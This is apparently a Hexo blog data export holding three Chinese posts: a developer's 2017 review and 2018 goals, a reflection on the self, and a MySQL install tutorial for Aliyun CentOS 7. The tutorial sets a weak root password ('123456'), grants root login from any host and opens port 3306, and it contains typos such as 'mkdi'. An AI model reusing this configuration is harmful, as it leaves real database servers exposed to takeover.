DBA，能更快地迁移类似的模块。后来参与研发 ipsos 雷达。</li>\n</ul>\n<blockquote>\n<p>学习上</p>\n</blockquote>\n<ul>\n<li>关于 vue：这一年，也算写了大量的 vue 代码，但 vue 封装了大量的 js 代码，屏蔽底层实现细节，所以我很清楚会写 vue 并不算什么，在前端框架日新月异的今天，只有深入地了解并掌握其中原理，才能以不变应万变。</li>\n<li>关于可视化方向：由于 echarts 底层封装实在是过于复杂，也没有仔细去研究，只能去应用它的 api，这是我所遗憾的地方。</li>\n<li>关于构建工具：先是接触了 gulp，但并不是了解得很清楚。而对于 webpack 这一块，配置得也算还可以，也大概知晓构建工具在前端方面的应用，但是我觉得不要满足于只做一个配置工程师，知道思想最为重要，要知道为什么会有压缩代码，合并请求等操作。</li>\n<li>关于读书：喜欢看人物传记，比如爱因斯坦。物理学和哲学上有趣的书也看了不少,极大的开阔了我的眼界。关于 JavaScript 的书，把《你不知道的 JavaScript》也翻了一遍，对于算法（图解算法）也大概翻了一下。</li>\n<li>关于印象笔记：只是自己选择的一种记录的工具，因为之前请教别人的时候发现，别人说了一遍方法，但是会很快忘记，所以这时候最好把它记录下来。笔记里记录了今年工作上遇到的问题，方便自己快速复查。</li>\n</ul>\n<blockquote>\n<p>总结</p>\n</blockquote>\n<ul>\n<li>总的来说，这一年，觉得自己是”开眼看世界”的一年，知道自己是热爱前端的，也知道一个好的前端工程师，他首先得是一个工程师，势必要了解算法，http 等基础知识。而纵向学习是提升学习深度的结果，而不是追求学习广度的结果。</li>\n</ul>\n<h4 id=\"2018-展望\"><a href=\"#2018-展望\" class=\"headerlink\" title=\"2018 展望\"></a>2018 展望</h4><blockquote>\n<p>工作上</p>\n</blockquote>\n<ul>\n<li>前端系统搭建:yoda 系统搭建。</li>\n<li>后端：学习一下 java，希望能接触组内一些后端的项目，简单写些接口。</li>\n<li>业务组件库：业务上建立一个属于自己乃至于公司的组件库，因为做产品发现，一个好用的业务组件能提升很多开发效率。</li>\n<li>数据分析：由于我们团队比较偏向分析，可以多向分析师取经。眼光应该放宽一点，学习数据方面的分析，才能对公司的产品和项目有更好的感知度。</li>\n</ul>\n<blockquote>\n<p>学习上</p>\n</blockquote>\n<ul>\n<li>MVVM 框架：希望能熟练使用 react 和 angular，最终目标希望能自己造一个小巧的 mvvm 框架，当然造轮子的意义是为了自己学习。</li>\n<li>Node 开发：能编写一个 express 或者 koa 的中间件。熟练掌握 CRUD 应用。</li>\n<li>构建工具：梳理前端构建工具，把常用的大概研究一遍。</li>\n<li>Typescript：学习 typescript，相信强类型一定会在将来被纳入 ECMAScript 的标准。</li>\n<li>关于笔记：希望能把每天要做的事，坚持写在 oneNote，养成良好习惯。而工作上要记下来的写在印象笔记。</li>\n<li>Java：能熟练进行 web 开发。</li>\n<li>关于可视化方向：学习 d3.js 和 three.js。</li>\n<li>关于读书：坚持读书，温故知新更为重要。</li>\n<li>关于英语：英语实在是太重要了，需要加强学习。</li>\n</ul>\n<blockquote>\n<p>生活习惯</p>\n</blockquote>\n<ul>\n<li>保持精力充沛的前提是要有足够的锻炼，如果每天实在是没有忙到要加班的情况，可以九点走，放好书包后出来跑半小时的步。</li>\n<li>坚持八点起床，注意自己的仪容仪表。</li>\n</ul>\n<blockquote>\n<p>总结</p>\n</blockquote>\n<ul>\n<li>多增加了一个维度，同时希望自己能真正对得起工程师这个 title。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"2017-总结\"><a href=\"#2017-总结\" class=\"headerlink\" title=\"2017 总结\"></a>2017 总结</h4><blockquote>\n<p>工作上</p>\n</blockquote>\n<ul>\n<li>官网方面：17 年 1 月进入到公司，当时正值官网重构，组长为了锻炼我，便让我参与到了官网的重构当中。</li>\n<li>产品方面：官网完成之后，雷达刚好升级 2.0，我去负责其中两个模块的迁移。之后一直负责雷达的开发，维护过立方，聚合，接触了很多公司的产品。</li>\n<li>项目方面：期间维护 MIG 系统，并且重构了整个 DBA，能更快地迁移类似的模块。后来参与研发 ipsos 雷达。</li>\n</ul>\n<blockquote>\n<p>学习上</p>\n</blockquote>\n<ul>\n<li>关于 vue：这一年，也算写了大量的 vue 代码，但 vue 封装了大量的 js 代码，屏蔽底层实现细节，所以我很清楚会写 vue 并不算什么，在前端框架日新月异的今天，只有深入地了解并掌握其中原理，才能以不变应万变。</li>\n<li>关于可视化方向：由于 echarts 底层封装实在是过于复杂，也没有仔细去研究，只能去应用它的 api，这是我所遗憾的地方。</li>\n<li>关于构建工具：先是接触了 gulp，但并不是了解得很清楚。而对于 webpack 这一块，配置得也算还可以，也大概知晓构建工具在前端方面的应用，但是我觉得不要满足于只做一个配置工程师，知道思想最为重要，要知道为什么会有压缩代码，合并请求等操作。</li>\n<li>关于读书：喜欢看人物传记，比如爱因斯坦。物理学和哲学上有趣的书也看了不少,极大的开阔了我的眼界。关于 JavaScript 的书，把《你不知道的 JavaScript》也翻了一遍，对于算法（图解算法）也大概翻了一下。</li>\n<li>关于印象笔记：只是自己选择的一种记录的工具，因为之前请教别人的时候发现，别人说了一遍方法，但是会很快忘记，所以这时候最好把它记录下来。笔记里记录了今年工作上遇到的问题，方便自己快速复查。</li>\n</ul>\n<blockquote>\n<p>总结</p>\n</blockquote>\n<ul>\n<li>总的来说，这一年，觉得自己是”开眼看世界”的一年，知道自己是热爱前端的，也知道一个好的前端工程师，他首先得是一个工程师，势必要了解算法，http 等基础知识。而纵向学习是提升学习深度的结果，而不是追求学习广度的结果。</li>\n</ul>\n<h4 id=\"2018-展望\"><a href=\"#2018-展望\" class=\"headerlink\" title=\"2018 展望\"></a>2018 展望</h4><blockquote>\n<p>工作上</p>\n</blockquote>\n<ul>\n<li>前端系统搭建:yoda 系统搭建。</li>\n<li>后端：学习一下 java，希望能接触组内一些后端的项目，简单写些接口。</li>\n<li>业务组件库：业务上建立一个属于自己乃至于公司的组件库，因为做产品发现，一个好用的业务组件能提升很多开发效率。</li>\n<li>数据分析：由于我们团队比较偏向分析，可以多向分析师取经。眼光应该放宽一点，学习数据方面的分析，才能对公司的产品和项目有更好的感知度。</li>\n</ul>\n<blockquote>\n<p>学习上</p>\n</blockquote>\n<ul>\n<li>MVVM 框架：希望能熟练使用 react 和 angular，最终目标希望能自己造一个小巧的 mvvm 框架，当然造轮子的意义是为了自己学习。</li>\n<li>Node 开发：能编写一个 express 或者 koa 的中间件。熟练掌握 CRUD 应用。</li>\n<li>构建工具：梳理前端构建工具，把常用的大概研究一遍。</li>\n<li>Typescript：学习 typescript，相信强类型一定会在将来被纳入 ECMAScript 的标准。</li>\n<li>关于笔记：希望能把每天要做的事，坚持写在 oneNote，养成良好习惯。而工作上要记下来的写在印象笔记。</li>\n<li>Java：能熟练进行 web 开发。</li>\n<li>关于可视化方向：学习 d3.js 和 three.js。</li>\n<li>关于读书：坚持读书，温故知新更为重要。</li>\n<li>关于英语：英语实在是太重要了，需要加强学习。</li>\n</ul>\n<blockquote>\n<p>生活习惯</p>\n</blockquote>\n<ul>\n<li>保持精力充沛的前提是要有足够的锻炼，如果每天实在是没有忙到要加班的情况，可以九点走，放好书包后出来跑半小时的步。</li>\n<li>坚持八点起床，注意自己的仪容仪表。</li>\n</ul>\n<blockquote>\n<p>总结</p>\n</blockquote>\n<ul>\n<li>多增加了一个维度，同时希望自己能真正对得起工程师这个 title。</li>\n</ul>\n"},{"title":"对于'我'的思考","date":"2018-07-15T09:38:59.000Z","_content":"\n# ‘我’是什么\n\n> 一个人有两个我。一个在黑暗中醒着，一个在光明中睡着。——纪伯伦\n\n- ‘我’是人类创造出来表达自我的词汇，但其实这里定义已经有误，不能用重复性词语进行描述。\n- 那怎么定义呢，我想这是个很大的问题，大到佛家都论证有'无我'一说。\n- 这里先简单分为内在的我，外在的我两个部分。\n\n### 内在的我\n\n- 其实核心是灵魂，是你自我意志的体现，来源\n- 而后是你从小到大经历的伤害，也可以称之为苦难，包在你的灵魂外面\n- 这个苦难就会在外面造就一个内在批评家，告诉你哪些不要做，哪些要做，胆小怕事还是胆大妄为其实取决于此。比如会有一个声音告诉你，你遇到了什么事情，要以什么样的方式去做\n- 这样你在别人眼里就会被打上标签，谨慎，聪明等等，这其实是你在这个社会的外在角色\n\n### 外在的我\n\n- 是内在的我映射出来的外在角色在团队，组织，乃至于整个社会的‘我’\n\n# 昨天的我和今天的我\n\n- 昨天的我做完了所有的事，晚上睡觉第二天睁眼一看，我跟昨天的我有什么关系呢？昨天的我和今天的我可以自我感知是另外一个完全不一样的人\n- 但是是昨天这个状态的我，才会导致现在醒来的我躺在了这张床上，这是一个连续状态的我。\n- 但是我经常会感觉到这种状态不连续，也就是我会觉得这种联系是断层的。\n- 于是我想到人是一个会思考的芦苇，如果我对当下的思考在未来也可以深刻感受到（除了记忆太久远，会忘记之外），我才会真真切切的感受这样连续的状态。\n- 而且人生是一场长跑，我肯定是在不停的进步的，是你会觉得自己和从前有所不同的其中一个原因。\n- 所以只有强化自己当下‘想’的状态，不断的享受思考这一过程，才会让更加深刻认识到自己\n\n### 如何强化'想'的状态\n\n> 历史上能成就一番事业的，必定是对自己想得很明白的人。\n\n- 写下来你的感受，不断写不断回顾\n- 去感受不同的世界观，去不同的地方\n\n### 迷惑的'我'\n\n- 有时候在出租车上，在看电影的时候等等，会突然像是大梦初醒，为何我是在这个宇宙降临了'我'这样的意识——先是怀疑这个宇宙，其次是怀疑'我'这个意识\n- 如果是科学来解释，也无法说明：通过各种化学物质反应而成的‘我’这个意志，为何存在于这个躯壳，而不是其他人。\n","source":"_posts/2018-think-01.md","raw":"---\ntitle: 对于'我'的思考\ndate: 2018-07-15 17:38:59\ntags: 生活随想\n---\n\n# ‘我’是什么\n\n> 一个人有两个我。一个在黑暗中醒着，一个在光明中睡着。——纪伯伦\n\n- ‘我’是人类创造出来表达自我的词汇，但其实这里定义已经有误，不能用重复性词语进行描述。\n- 那怎么定义呢，我想这是个很大的问题，大到佛家都论证有'无我'一说。\n- 这里先简单分为内在的我，外在的我两个部分。\n\n### 内在的我\n\n- 其实核心是灵魂，是你自我意志的体现，来源\n- 而后是你从小到大经历的伤害，也可以称之为苦难，包在你的灵魂外面\n- 这个苦难就会在外面造就一个内在批评家，告诉你哪些不要做，哪些要做，胆小怕事还是胆大妄为其实取决于此。比如会有一个声音告诉你，你遇到了什么事情，要以什么样的方式去做\n- 这样你在别人眼里就会被打上标签，谨慎，聪明等等，这其实是你在这个社会的外在角色\n\n### 外在的我\n\n- 是内在的我映射出来的外在角色在团队，组织，乃至于整个社会的‘我’\n\n# 昨天的我和今天的我\n\n- 昨天的我做完了所有的事，晚上睡觉第二天睁眼一看，我跟昨天的我有什么关系呢？昨天的我和今天的我可以自我感知是另外一个完全不一样的人\n- 但是是昨天这个状态的我，才会导致现在醒来的我躺在了这张床上，这是一个连续状态的我。\n- 但是我经常会感觉到这种状态不连续，也就是我会觉得这种联系是断层的。\n- 于是我想到人是一个会思考的芦苇，如果我对当下的思考在未来也可以深刻感受到（除了记忆太久远，会忘记之外），我才会真真切切的感受这样连续的状态。\n- 而且人生是一场长跑，我肯定是在不停的进步的，是你会觉得自己和从前有所不同的其中一个原因。\n- 所以只有强化自己当下‘想’的状态，不断的享受思考这一过程，才会让更加深刻认识到自己\n\n### 如何强化'想'的状态\n\n> 历史上能成就一番事业的，必定是对自己想得很明白的人。\n\n- 写下来你的感受，不断写不断回顾\n- 去感受不同的世界观，去不同的地方\n\n### 迷惑的'我'\n\n- 有时候在出租车上，在看电影的时候等等，会突然像是大梦初醒，为何我是在这个宇宙降临了'我'这样的意识——先是怀疑这个宇宙，其次是怀疑'我'这个意识\n- 如果是科学来解释，也无法说明：通过各种化学物质反应而成的‘我’这个意志，为何存在于这个躯壳，而不是其他人。\n","slug":"2018-think-01","published":1,"updated":"2018-08-13T13:25:24.408Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ji00060iofch2ya4zf","content":"<h1 id=\"‘我’是什么\"><a href=\"#‘我’是什么\" class=\"headerlink\" title=\"‘我’是什么\"></a>‘我’是什么</h1><blockquote>\n<p>一个人有两个我。一个在黑暗中醒着，一个在光明中睡着。——纪伯伦</p>\n</blockquote>\n<ul>\n<li>‘我’是人类创造出来表达自我的词汇，但其实这里定义已经有误，不能用重复性词语进行描述。</li>\n<li>那怎么定义呢，我想这是个很大的问题，大到佛家都论证有’无我’一说。</li>\n<li>这里先简单分为内在的我，外在的我两个部分。</li>\n</ul>\n<h3 id=\"内在的我\"><a href=\"#内在的我\" class=\"headerlink\" title=\"内在的我\"></a>内在的我</h3><ul>\n<li>其实核心是灵魂，是你自我意志的体现，来源</li>\n<li>而后是你从小到大经历的伤害，也可以称之为苦难，包在你的灵魂外面</li>\n<li>这个苦难就会在外面造就一个内在批评家，告诉你哪些不要做，哪些要做，胆小怕事还是胆大妄为其实取决于此。比如会有一个声音告诉你，你遇到了什么事情，要以什么样的方式去做</li>\n<li>这样你在别人眼里就会被打上标签，谨慎，聪明等等，这其实是你在这个社会的外在角色</li>\n</ul>\n<h3 id=\"外在的我\"><a href=\"#外在的我\" class=\"headerlink\" title=\"外在的我\"></a>外在的我</h3><ul>\n<li>是内在的我映射出来的外在角色在团队，组织，乃至于整个社会的‘我’</li>\n</ul>\n<h1 id=\"昨天的我和今天的我\"><a href=\"#昨天的我和今天的我\" class=\"headerlink\" title=\"昨天的我和今天的我\"></a>昨天的我和今天的我</h1><ul>\n<li>昨天的我做完了所有的事，晚上睡觉第二天睁眼一看，我跟昨天的我有什么关系呢？昨天的我和今天的我可以自我感知是另外一个完全不一样的人</li>\n<li>但是是昨天这个状态的我，才会导致现在醒来的我躺在了这张床上，这是一个连续状态的我。</li>\n<li>但是我经常会感觉到这种状态不连续，也就是我会觉得这种联系是断层的。</li>\n<li>于是我想到人是一个会思考的芦苇，如果我对当下的思考在未来也可以深刻感受到（除了记忆太久远，会忘记之外），我才会真真切切的感受这样连续的状态。</li>\n<li>而且人生是一场长跑，我肯定是在不停的进步的，是你会觉得自己和从前有所不同的其中一个原因。</li>\n<li>所以只有强化自己当下‘想’的状态，不断的享受思考这一过程，才会让更加深刻认识到自己</li>\n</ul>\n<h3 id=\"如何强化’想’的状态\"><a href=\"#如何强化’想’的状态\" class=\"headerlink\" title=\"如何强化’想’的状态\"></a>如何强化’想’的状态</h3><blockquote>\n<p>历史上能成就一番事业的，必定是对自己想得很明白的人。</p>\n</blockquote>\n<ul>\n<li>写下来你的感受，不断写不断回顾</li>\n<li>去感受不同的世界观，去不同的地方</li>\n</ul>\n<h3 id=\"迷惑的’我’\"><a href=\"#迷惑的’我’\" class=\"headerlink\" title=\"迷惑的’我’\"></a>迷惑的’我’</h3><ul>\n<li>有时候在出租车上，在看电影的时候等等，会突然像是大梦初醒，为何我是在这个宇宙降临了’我’这样的意识——先是怀疑这个宇宙，其次是怀疑’我’这个意识</li>\n<li>如果是科学来解释，也无法说明：通过各种化学物质反应而成的‘我’这个意志，为何存在于这个躯壳，而不是其他人。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"‘我’是什么\"><a href=\"#‘我’是什么\" class=\"headerlink\" title=\"‘我’是什么\"></a>‘我’是什么</h1><blockquote>\n<p>一个人有两个我。一个在黑暗中醒着，一个在光明中睡着。——纪伯伦</p>\n</blockquote>\n<ul>\n<li>‘我’是人类创造出来表达自我的词汇，但其实这里定义已经有误，不能用重复性词语进行描述。</li>\n<li>那怎么定义呢，我想这是个很大的问题，大到佛家都论证有’无我’一说。</li>\n<li>这里先简单分为内在的我，外在的我两个部分。</li>\n</ul>\n<h3 id=\"内在的我\"><a href=\"#内在的我\" class=\"headerlink\" title=\"内在的我\"></a>内在的我</h3><ul>\n<li>其实核心是灵魂，是你自我意志的体现，来源</li>\n<li>而后是你从小到大经历的伤害，也可以称之为苦难，包在你的灵魂外面</li>\n<li>这个苦难就会在外面造就一个内在批评家，告诉你哪些不要做，哪些要做，胆小怕事还是胆大妄为其实取决于此。比如会有一个声音告诉你，你遇到了什么事情，要以什么样的方式去做</li>\n<li>这样你在别人眼里就会被打上标签，谨慎，聪明等等，这其实是你在这个社会的外在角色</li>\n</ul>\n<h3 id=\"外在的我\"><a href=\"#外在的我\" class=\"headerlink\" title=\"外在的我\"></a>外在的我</h3><ul>\n<li>是内在的我映射出来的外在角色在团队，组织，乃至于整个社会的‘我’</li>\n</ul>\n<h1 id=\"昨天的我和今天的我\"><a href=\"#昨天的我和今天的我\" class=\"headerlink\" title=\"昨天的我和今天的我\"></a>昨天的我和今天的我</h1><ul>\n<li>昨天的我做完了所有的事，晚上睡觉第二天睁眼一看，我跟昨天的我有什么关系呢？昨天的我和今天的我可以自我感知是另外一个完全不一样的人</li>\n<li>但是是昨天这个状态的我，才会导致现在醒来的我躺在了这张床上，这是一个连续状态的我。</li>\n<li>但是我经常会感觉到这种状态不连续，也就是我会觉得这种联系是断层的。</li>\n<li>于是我想到人是一个会思考的芦苇，如果我对当下的思考在未来也可以深刻感受到（除了记忆太久远，会忘记之外），我才会真真切切的感受这样连续的状态。</li>\n<li>而且人生是一场长跑，我肯定是在不停的进步的，是你会觉得自己和从前有所不同的其中一个原因。</li>\n<li>所以只有强化自己当下‘想’的状态，不断的享受思考这一过程，才会让更加深刻认识到自己</li>\n</ul>\n<h3 id=\"如何强化’想’的状态\"><a href=\"#如何强化’想’的状态\" class=\"headerlink\" title=\"如何强化’想’的状态\"></a>如何强化’想’的状态</h3><blockquote>\n<p>历史上能成就一番事业的，必定是对自己想得很明白的人。</p>\n</blockquote>\n<ul>\n<li>写下来你的感受，不断写不断回顾</li>\n<li>去感受不同的世界观，去不同的地方</li>\n</ul>\n<h3 id=\"迷惑的’我’\"><a href=\"#迷惑的’我’\" class=\"headerlink\" title=\"迷惑的’我’\"></a>迷惑的’我’</h3><ul>\n<li>有时候在出租车上，在看电影的时候等等，会突然像是大梦初醒，为何我是在这个宇宙降临了’我’这样的意识——先是怀疑这个宇宙，其次是怀疑’我’这个意识</li>\n<li>如果是科学来解释，也无法说明：通过各种化学物质反应而成的‘我’这个意志，为何存在于这个躯壳，而不是其他人。</li>\n</ul>\n"},{"title":"阿里云centos7的mysql安装与启动","date":"2018-08-26T08:07:52.000Z","_content":"\n## 背景\n\n- 需要给人开发一个项目，然后我让客户自己选购了阿里云的 centos7 系统（他才买了 350 元一年，我很好奇为什么这么便宜，我是 680...杀熟嘛）\n- 然后让客户用 ssh 工具配置，这样我就可以通过 ssh 来连接他的服务器了\n- 这个时候我就需要安装 mysql，并在外面来远程连接了\n\n## 安装 mysql\n\n#### 安装依赖包\n\n```javascript\nyum -y install gcc gcc-c++ ncurses ncurses-devel cmake bison\n```\n\n###### yum 和 rpm 是什么\n\n- yum，是 Yellow dog Updater Modified 的简称，起初是由 yellow dog 这一发行版的开发者 Terra Soft 研发，用 python 写成，那时还叫做 yup(yellow dog updater)，后经杜克大学的 Linux@Duke 开发团队进行改进，遂有此名。\n- yum 的宗旨是自动化地升级，安装/移除 rpm 包，收集 rpm 包的相关信息，检查依赖性并自动提示用户解决。\n- rpm（二进制包）是 linux 的可执行程序，类似 windows 的 exe 文件\n\n#### 先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动\n\n```javascript\nrpm -qa | grep mysql 查看有哪些安装包\nyum remove mysql mysql-server mysql-libs compat-mysql51 注意这个卸载不干净\nrm -rf /var/lib/mysql\nrm /etc/my.cnf\nrpm -qa|grep mysql 再看下有没有删完\nwhereis mysql 查看残留的目录、如有则删除\n```\n\n- 如果发现有安装包，可以用 rpm -e 命令删掉安装包\n\n#### 下载 Mysql 的 repo 源\n\n```javascript\nmkdi /usr/local/download\ncd /usr/local/download/\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n```\n\n#### 安装 mysql-community-release-el7-5.noarch.rpm 包\n\n```javascript\nrpm -ivh mysql-community-release-el7-5.noarch.rpm //rpm -ivh是安装命令的意思\n```\n\n#### 安装 mysql\n\n- yum install -y mysql-community-server\n\n#### 安装成功后重启 MySQL 服务\n\n- service mysqld restart\n\n#### 查看 MySQL 服务进程和端口\n\n```javascript\nps -ef | grep mysql\nnetstat -tunpl | grep 3306\n```\n\n- ps 命令是 Process Status 的缩写\n- ps 命令用来列出系统中当前运行的那些进程。ps 命令列出的是当前那些进程的快照，就是执行 ps 命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用 top 命令。[ps 命令详情实例查看这里](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/ps.html#id7)\n- netstat 是显示各种网络信息的工具\n\n#### 获取 mysql 默认密码\n\n- grep 'temporary password' /var/log/mysqld.log\n- 如果没有反应，需要重置密码\n\n```javascript\nmysql -u root\nuse mysql;\nupdate user set password=password('123456') where user='root';\ndelete from user where user='';//删除空用户\nsystemctl restart mysql//重启mysql\n```\n\n#### 需要远程连接\n\n- 开放 3306 端口\n\n```javascript\nsystemctl start firewalld.service //启动防火墙\nfirewall-cmd --permanent --add-port=3306/tcp\nfirewall-cmd --reload\n```\n\n- 开启远程登录\n\n```javascript\nmysql -u root -p\nuse mysql;\nupdate user set host='%' where user='root' and host='localhost';\nexit；\nsystemctl restart mysql//重启mysql\n```\n\n## 阿里云远程连接的坑\n\n- 在外面怎么连接 mysql 各种超时，即使把防火墙关了也无济于事。是因为阿里云有个[安全组策略](https://help.aliyun.com/document_detail/25471.html)\n- [在安全组策略配置 3306 端口开放](https://blog.csdn.net/u010955892/article/details/72774920)\n","source":"_posts/centos7-mysql.md","raw":"---\ntitle: 阿里云centos7的mysql安装与启动\ndate: 2018-08-26 16:07:52\ntags: mysql\n---\n\n## 背景\n\n- 需要给人开发一个项目，然后我让客户自己选购了阿里云的 centos7 系统（他才买了 350 元一年，我很好奇为什么这么便宜，我是 680...杀熟嘛）\n- 然后让客户用 ssh 工具配置，这样我就可以通过 ssh 来连接他的服务器了\n- 这个时候我就需要安装 mysql，并在外面来远程连接了\n\n## 安装 mysql\n\n#### 安装依赖包\n\n```javascript\nyum -y install gcc gcc-c++ ncurses ncurses-devel cmake bison\n```\n\n###### yum 和 rpm 是什么\n\n- yum，是 Yellow dog Updater Modified 的简称，起初是由 yellow dog 这一发行版的开发者 Terra Soft 研发，用 python 写成，那时还叫做 yup(yellow dog updater)，后经杜克大学的 Linux@Duke 开发团队进行改进，遂有此名。\n- yum 的宗旨是自动化地升级，安装/移除 rpm 包，收集 rpm 包的相关信息，检查依赖性并自动提示用户解决。\n- rpm（二进制包）是 linux 的可执行程序，类似 windows 的 exe 文件\n\n#### 先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动\n\n```javascript\nrpm -qa | grep mysql 查看有哪些安装包\nyum remove mysql mysql-server mysql-libs compat-mysql51 注意这个卸载不干净\nrm -rf /var/lib/mysql\nrm /etc/my.cnf\nrpm -qa|grep mysql 再看下有没有删完\nwhereis mysql 查看残留的目录、如有则删除\n```\n\n- 如果发现有安装包，可以用 rpm -e 命令删掉安装包\n\n#### 下载 Mysql 的 repo 源\n\n```javascript\nmkdi /usr/local/download\ncd /usr/local/download/\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n```\n\n#### 安装 mysql-community-release-el7-5.noarch.rpm 包\n\n```javascript\nrpm -ivh mysql-community-release-el7-5.noarch.rpm //rpm -ivh是安装命令的意思\n```\n\n#### 安装 mysql\n\n- yum install -y mysql-community-server\n\n#### 安装成功后重启 MySQL 服务\n\n- service mysqld restart\n\n#### 查看 MySQL 服务进程和端口\n\n```javascript\nps -ef | grep mysql\nnetstat -tunpl | grep 3306\n```\n\n- ps 命令是 Process Status 的缩写\n- ps 命令用来列出系统中当前运行的那些进程。ps 命令列出的是当前那些进程的快照，就是执行 ps 命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用 top 命令。[ps 命令详情实例查看这里](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/ps.html#id7)\n- netstat 是显示各种网络信息的工具\n\n#### 获取 mysql 默认密码\n\n- grep 'temporary password' /var/log/mysqld.log\n- 如果没有反应，需要重置密码\n\n```javascript\nmysql -u root\nuse mysql;\nupdate user set password=password('123456') where user='root';\ndelete from user where user='';//删除空用户\nsystemctl restart mysql//重启mysql\n```\n\n#### 需要远程连接\n\n- 开放 3306 端口\n\n```javascript\nsystemctl start firewalld.service //启动防火墙\nfirewall-cmd --permanent --add-port=3306/tcp\nfirewall-cmd --reload\n```\n\n- 开启远程登录\n\n```javascript\nmysql -u root -p\nuse mysql;\nupdate user set host='%' where user='root' and host='localhost';\nexit；\nsystemctl restart mysql//重启mysql\n```\n\n## 阿里云远程连接的坑\n\n- 在外面怎么连接 mysql 各种超时，即使把防火墙关了也无济于事。是因为阿里云有个[安全组策略](https://help.aliyun.com/document_detail/25471.html)\n- [在安全组策略配置 3306 端口开放](https://blog.csdn.net/u010955892/article/details/72774920)\n","slug":"centos7-mysql","published":1,"updated":"2018-10-21T07:48:37.748Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jk00070iofhyvcnbgs","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>需要给人开发一个项目，然后我让客户自己选购了阿里云的 centos7 系统（他才买了 350 元一年，我很好奇为什么这么便宜，我是 680…杀熟嘛）</li>\n<li>然后让客户用 ssh 工具配置，这样我就可以通过 ssh 来连接他的服务器了</li>\n<li>这个时候我就需要安装 mysql，并在外面来远程连接了</li>\n</ul>\n<h2 id=\"安装-mysql\"><a href=\"#安装-mysql\" class=\"headerlink\" title=\"安装 mysql\"></a>安装 mysql</h2><h4 id=\"安装依赖包\"><a href=\"#安装依赖包\" class=\"headerlink\" title=\"安装依赖包\"></a>安装依赖包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install gcc gcc-c++ ncurses ncurses-devel cmake bison</span><br></pre></td></tr></table></figure>\n<h6 id=\"yum-和-rpm-是什么\"><a href=\"#yum-和-rpm-是什么\" class=\"headerlink\" title=\"yum 和 rpm 是什么\"></a>yum 和 rpm 是什么</h6><ul>\n<li>yum，是 Yellow dog Updater Modified 的简称，起初是由 yellow dog 这一发行版的开发者 Terra Soft 研发，用 python 写成，那时还叫做 yup(yellow dog updater)，后经杜克大学的 Linux@Duke 开发团队进行改进，遂有此名。</li>\n<li>yum 的宗旨是自动化地升级，安装/移除 rpm 包，收集 rpm 包的相关信息，检查依赖性并自动提示用户解决。</li>\n<li>rpm（二进制包）是 linux 的可执行程序，类似 windows 的 exe 文件</li>\n</ul>\n<h4 id=\"先检测系统是否自带原有版本-mysql-安装包，如果有要先卸载删除，不然不能成功安装和启动\"><a href=\"#先检测系统是否自带原有版本-mysql-安装包，如果有要先卸载删除，不然不能成功安装和启动\" class=\"headerlink\" title=\"先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动\"></a>先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -qa | grep mysql 查看有哪些安装包</span><br><span class=\"line\">yum remove mysql mysql-server mysql-libs compat-mysql51 注意这个卸载不干净</span><br><span class=\"line\">rm -rf /<span class=\"keyword\">var</span>/lib/mysql</span><br><span class=\"line\">rm /etc/my.cnf</span><br><span class=\"line\">rpm -qa|grep mysql 再看下有没有删完</span><br><span class=\"line\">whereis mysql 查看残留的目录、如有则删除</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果发现有安装包，可以用 rpm -e 命令删掉安装包</li>\n</ul>\n<h4 id=\"下载-Mysql-的-repo-源\"><a href=\"#下载-Mysql-的-repo-源\" class=\"headerlink\" title=\"下载 Mysql 的 repo 源\"></a>下载 Mysql 的 repo 源</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdi /usr/local/download</span><br><span class=\"line\">cd /usr/local/download/</span><br><span class=\"line\">wget http:<span class=\"comment\">//dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\">wget http:<span class=\"comment\">//dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装-mysql-community-release-el7-5-noarch-rpm-包\"><a href=\"#安装-mysql-community-release-el7-5-noarch-rpm-包\" class=\"headerlink\" title=\"安装 mysql-community-release-el7-5.noarch.rpm 包\"></a>安装 mysql-community-release-el7-5.noarch.rpm 包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh mysql-community-release-el7<span class=\"number\">-5.</span>noarch.rpm <span class=\"comment\">//rpm -ivh是安装命令的意思</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装-mysql-1\"><a href=\"#安装-mysql-1\" class=\"headerlink\" title=\"安装 mysql\"></a>安装 mysql</h4><ul>\n<li>yum install -y mysql-community-server</li>\n</ul>\n<h4 id=\"安装成功后重启-MySQL-服务\"><a href=\"#安装成功后重启-MySQL-服务\" 